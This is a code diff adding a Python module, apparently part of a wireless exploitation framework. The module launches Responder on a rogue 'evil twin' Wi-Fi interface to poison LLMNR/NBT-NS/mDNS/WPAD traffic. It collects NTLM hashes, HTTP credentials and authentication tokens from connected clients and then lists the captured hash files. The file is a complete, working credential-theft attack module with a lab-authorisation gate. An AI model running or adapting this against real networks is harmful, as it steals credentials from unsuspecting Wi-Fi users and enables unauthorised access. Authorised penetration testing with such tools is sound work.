@@ -1,0 +1,126 @@
+#!/usr/bin/env python3
+# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+"""LLMNR/NBT-NS/mDNS Responder poisoning over rogue Wi-Fi.
+
+Launches Responder on the rogue AP interface to capture NTLM hashes,
+HTTP credentials, and other authentication tokens from clients connected
+to the evil twin. Inspired by wifipumpkin3's Responder integration.
+
+Requires: Responder.py (https://github.com/lgandx/Responder)
+
+Version: 1.0.0
+"""
+
+from __future__ import annotations
+
+import logging
+import shutil
+import subprocess
+from pathlib import Path
+
+from wirelessxpl.core.exploit import *
+
+from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
+
+logger = logging.getLogger(__name__)
+
+
+class Exploit(Exploit):
+    """LLMNR/NBT-NS/mDNS Responder on rogue Wi-Fi interface."""
+
+    __info__ = {
+        "name": "Responder Wi-Fi",
+        "description": (
+            "LLMNR/NBT-NS/mDNS poisoning via Responder on rogue AP interface. "
+            "Captures NTLM hashes, HTTP credentials, and auth tokens from clients "
+            "connected to evil twin. Requires Responder.py."
+        ),
+        "authors": ("André Henrique (@mrhenrike) | União Geek",),
+        "references": (
+            "https://github.com/lgandx/Responder",
+            "https://github.com/P0cL4bs/wifipumpkin3",
+        ),
+        "devices": ("wifi",),
+    }
+
+    interface = OptString("wlan0", "Rogue AP interface for Responder")
+    analyze_mode = OptBool(False, "Analyze mode only (no poisoning, passive)")
+    enable_http = OptBool(True, "Enable HTTP server in Responder")
+    enable_smb = OptBool(True, "Enable SMB server in Responder")
+    enable_wpad = OptBool(True, "Enable WPAD proxy in Responder")
+    force_wpad_auth = OptBool(False, "Force WPAD authentication (aggressive)")
+    verbose = OptBool(False, "Enable verbose output")
+    log_dir = OptString(".log/responder", "Directory for Responder logs")
+    dry_run = OptBool(False, "Print command without executing")
+
+    def _find_responder(self) -> str:
+        """Locate Responder binary."""
+        for name in ("responder", "Responder.py", "responder.py"):
+            path = shutil.which(name)
+            if path:
+                return path
+
+        common_paths = [
+            "/usr/share/responder/Responder.py",
+            "/opt/Responder/Responder.py",
+            "/usr/bin/responder",
+        ]
+        for p in common_paths:
+            if Path(p).exists():
+                return p
+
+        return ""
+
+    def run(self) -> None:
+        """Execute Responder on rogue AP interface."""
+        require_authorised_lab()
+
+        responder = self._find_responder()
+        if not responder:
+            print_error("Responder not found. Install: apt install responder or clone lgandx/Responder")
+            return
+
+        log_dir = Path(self.log_dir)
+        log_dir.mkdir(parents=True, exist_ok=True)
+
+        cmd = ["sudo", "python3" if responder.endswith(".py") else responder]
+        if responder.endswith(".py"):
+            cmd.append(responder)
+
+        cmd.extend(["-I", self.interface])
+
+        if self.analyze_mode:
+            cmd.append("-A")
+        if self.verbose:
+            cmd.append("-v")
+        if self.force_wpad_auth:
+            cmd.append("-F")
+        if not self.enable_http:
+            cmd.append("--disable-ess")
+        if self.enable_wpad:
+            cmd.append("-w")
+
+        cmd_str = " ".join(cmd)
+
+        if self.dry_run:
+            print_info("DRY RUN — Responder command:")
+            print_status(cmd_str)
+            return
+
+        print_status("Launching Responder on {}...".format(self.interface))
+        print_info("Command: {}".format(cmd_str))
+        print_info("Logs: {}".format(log_dir))
+        print_info("Capturing LLMNR/NBT-NS/mDNS/WPAD from Wi-Fi clients...")
+
+        try:
+            subprocess.run(cmd, check=False)
+        except KeyboardInterrupt:
+            print_info("\nResponder interrupted.")
+        except Exception as err:
+            print_error("Responder failed: {}".format(err))
+
+        hash_files = list(log_dir.glob("*NTLM*")) + list(log_dir.glob("*hash*"))
+        if hash_files:
+            print_success("Captured hashes:")
+            for f in hash_files:
+                print_info("  {}".format(f))
